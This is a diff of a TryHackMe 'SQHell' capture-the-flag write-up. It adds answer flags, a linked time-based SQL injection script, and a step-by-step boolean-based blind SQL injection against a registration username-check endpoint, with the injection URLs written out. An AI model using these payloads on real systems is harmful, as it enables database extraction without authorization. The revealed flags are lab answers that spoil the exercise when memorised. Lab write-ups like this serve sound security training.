@@ -30,14 +30,81 @@ Hint: Unless displayed on the page the flags are stored in the flag table in the
 <br>
 
 > 1.2. <em>Flag 2</em>Hint : <em>Make sure to read the terms and conditions ;)</em><a id='1.2'></a>
->> <code><strong>T__________</strong></code><br>
+>> <code><strong>THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}</strong></code><br>
+
+<br>
+
+<p>Used the script below to discover the flag.<br>
+https://github.com/RosanaFSS/Cybersecurity-Journey-TryHackMe/blob/CTFs-%26-Infos/Medium%20%F0%9F%9A%A9%20-%20%20SQHell%20-%20Script%20-%20Time-Based%20SQL%20Injection.py</p>
+
+<br>
+
+<p>Ran <code>python3 script.py -i $RHOSTS</code>.</p>
 
 <br>
 
 > 1.3. <em>Flag 3</em><a id='1.3'></a>
->> <code><strong>___________</strong></code><br>
+>> <code><strong>THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308</strong></code><br>
 
 <br>
+
+<p>- Navigated to <code>http://TargetIP/register</code>.<br><br>
+- Enter any username.<br><br>
+- Received a message: <code>Username available</code><br><br>
+- Tried username: <code>admin</code>.<br><br>
+- Received a message: <code>Username already taken</code>.<br><br>
+- Viewed Page Source.</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/977d0e81-624c-49e4-ae77-a491970cf32c)
+
+<br>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/9b704042-34e5-4d4f-9fbd-99fa8359bd85)
+
+<br><br>
+
+
+![image](https://github.com/user-attachments/assets/ebd7f661-43d4-43a0-a75b-bcc1cc4cd60a)
+
+
+<br>
+
+<p>- For <code>admin</code> the Response is <code>false</code> = <code>this username is not available</code>.<br><br>
+- For <code>admi</code> the Response is <code>true</code> = <code>this username IS available</code>.<br><br></p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/eccbbf66-a9dc-42d0-a386-99ca3e50b0e5)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/1d3c71a8-5e09-4f27-a3ad-6da477d13c80)
+
+<br>
+
+<p>Tried <code>http://10.10.24.237/register/user-check?username=admin%27%20AND%20(substr((SELECT%20flag%20FROM%20flag%20LIMIT%200,1),1,1))=%27T%27--%20-</code>.<br><br>
+- The response was <code>false</code>.</p>
+
+<br>
+
+![image](https://github.com/user-attachments/assets/05f4ea60-a732-4346-8bd4-1d1210215002)
+
+<p>Tried <code>http://10.10.24.237/register/user-check?username=admin%27%20AND%20(substr((SELECT%20flag%20FROM%20flag%20LIMIT%200,1),1,1))=%27T%27--%20-</code>.<br><br>
+- The response was <code>false</code>.</p>
+
+<p>Tried <code>http://10.10.24.237/register/user-check?username=admin%27%20AND%20(substr((SELECT%20flag%20FROM%20flag%20LIMIT%200,1),1,1))=%27a%27--%20-</code>.<br><br>
+- The response was <code>true</code>.</p>
+
+<p>Used the script below to automate boolean-based SQL inject and to discover the third flag.<br>
+Script: </p>
+
+
+![image](https://github.com/user-attachments/assets/9aa107fb-8baa-465b-ba23-5798326e773f)
+
 
 > 1.4. <em>Flag 4</em>Hint : <em>Well, dreams, they feel real while we're in them right?</em><a id='1.4'></a>
 >> <code><strong>THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}</strong></code><br>
